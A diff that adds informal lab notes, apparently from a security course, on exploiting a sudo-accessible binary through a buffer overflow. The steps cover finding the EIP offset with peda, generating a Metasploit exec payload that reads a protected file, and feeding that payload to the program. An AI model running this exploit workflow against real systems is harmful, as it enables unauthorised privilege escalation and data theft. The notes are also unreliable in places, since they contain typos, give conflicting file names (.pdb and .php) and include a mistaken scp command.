@@ -1,0 +1,32 @@
+*** There's a hidden file, /.secret/.verysecret.pdb, on a remote machine that you need, but don't have, sudo access to. However, you do have sudo access to a different hidden file, /.hidden/inventory.exe. SSH into this remote boxto perform a buffer overflow within inventory.exe to determine the EIP, create a metasploit python script to expand the root privileges of that file to the versecret file.
+
+*** On remote target:
+(View privileges of fiiles with 'sudo -l')
+scp /.hidden/inventory.exe student@10.50.30.0: .
+./inventory.exe
+> AAAAAAA.....
+dmesg | tail -n 3
+(find the final 8 characters in sp; this is the EIP. Copy these hex characters - 4 bytes)
+
+*** Backj on home machine
+In python Demo.py script: set target as inverse hex bytes
+In peda: file inventory.exe (assuming it's already scp'd from the remote)
+run
+> (normal input a few times)
+> AAAAAA..... (break it)
+pattern create 100 (copy the result)
+run
+> (paste output from earlier)
+(obtain the 4 bytes next to EIP, without quotes)
+pattern offset <value from EIP> (copy the index that's returned)
+Get out of peda
+msfconsole
+search linux/x86
+use payload/linux/x86/exec)
+set CMD cat /.secret/.verysecret.php
+generate -f python -b '\x00\x20\x0a' (these are the common bad hexes) 
+(copy the output)
+
+*** back on remote
+edit the python script with the proper offset value & paste in python code. Change final comment statement if needed.
+./inventory.exe <<< $(python ~/demo.py)
